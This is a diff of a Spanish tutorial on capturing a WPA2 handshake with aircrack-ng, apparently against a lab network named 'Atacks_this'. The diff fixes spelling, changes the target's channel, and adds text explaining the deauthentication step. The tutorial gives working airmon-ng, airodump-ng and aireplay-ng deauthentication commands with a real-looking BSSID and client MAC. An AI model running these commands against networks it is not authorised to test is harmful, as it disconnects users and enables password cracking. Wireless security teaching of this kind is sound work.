@@ -83,7 +83,7 @@ El parámetro `check` lista los procesos que interfieren, `kill` los elimina.
 ## Modo monitor
 Ahora activaremos el modo monitor, esto permite que nuestro adaptador pueda capturar paquetes.
 
-Para activar el modo monitor existen varias opciones, esta vez lo aré con la herramienta airmon-ng.
+Para activar el modo monitor existen varias opciones, esta vez lo haré con la herramienta airmon-ng.
 
 Introducimos en la terminal el siguiente comando `sudo airmon-ng start wlx00c0caab5835` en tu caso has de substituir `wlx00c0caab5835` por el nombre de tu adaptador.
 
@@ -141,7 +141,7 @@ el comando para realizar este listado es `sudo airodump-ng wlx00c0caab5835` pero
 ```
  BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
                                                                                    
- 1C:B0:44:4C:CD:2F  -47       62        0    0   1  195   WPA2 CCMP   PSK  Atacks_this
+ 1C:B0:44:4C:CD:2F  -47       62        0    0   11  195   WPA2 CCMP   PSK  Atacks_this
  
  43-05-D9-79-A0-11  -73       60       16    0   1  130   WPA2 CCMP   PSK  Test_1
  
@@ -165,12 +165,12 @@ Una vez hecho esto vamos a recolectar la información que nos será útil al mom
 
 Lo que vamos a necesitar es la dirección mac de la red `(BSSID)` y el canal `(CH)` los demás datos nos aportan también mucha información, si quieres profundizar en el tema te recomiendo que visites la guía de [Airodump-ng](https://www.aircrack-ng.org/doku.php?id=airodump-ng)
 
-La red que voy a atacar es la que se llama `Atacks_this` como podemos ver el BSSID es `1C:B0:44:4C:CD:2F` y está en el canal `1`.
+La red que voy a atacar es la que se llama `Atacks_this` como podemos ver el BSSID es `1C:B0:44:4C:CD:2F` y está en el canal `11`.
 
 ## Nos centramos en el objetivo
 
 Con los datos previamente obtenidos vamos a escanear solamente a nuestro objetivo, esto nos permite ver con facilidad los clientes que están conectados a la red.
-Esto lo pedemos hacer con el mismo comando de antes, pero agregando -d más el BSSID `sudo airodump-ng wlx00c0caab5835 -d 1C:B0:44:4C:CD:2F`:
+Lo podemos hacer con el mismo comando de antes, pero agregando -d más el BSSID `sudo airodump-ng wlx00c0caab5835 -d 1C:B0:44:4C:CD:2F`:
 ```
 CH 1 ][ Elapsed: 24 s ][ 2022-03-06 20:45
 
@@ -221,8 +221,12 @@ Asignamos el punto de acceso con `--bssid 1C:B0:44:4C:CD:2F`
 
 Y por último seleccionamos nuestro adaptador de red `wlx00c0caab5835`
 
+Ahora podríamos recolectar el handshake de una forma pasiva esperando a que algún dispositivo se autentifique en la red, pero esto puede tardar mucho
+
 
 ## Ataque de desautenticación
+A continuacion, vamos a desautentificar a un dispositivo de la red, esto forzará a que se vuelva a autentificar y capturar así el handshake
+
 En otra ventana ejecutamos el comando `sudo aireplay-ng -0 1 -a 1C:B0:44:4C:CD:2F -c 28:16:7F:6D:4C:2C wlx00c0caab5835`
 
 
